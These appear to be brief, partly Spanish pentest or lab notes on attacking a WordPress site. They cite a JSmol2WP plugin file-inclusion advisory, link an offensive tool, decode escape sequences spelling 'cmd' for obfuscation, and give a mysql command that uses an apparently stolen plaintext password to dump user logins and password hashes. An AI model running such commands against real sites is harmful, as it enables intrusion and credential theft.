

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt

> WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. This can also be exploited for server-side request forgery.

https://github.com/nowak0x01/WPXStrike

Las secuencias codificadas representan la palabra cmd:

    \143 = c
    \155 = `m
    \x64 = `d
mysql -u wpuser --password=kbLSF2Vop#lw3rjDZ629*Z%G -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;" 
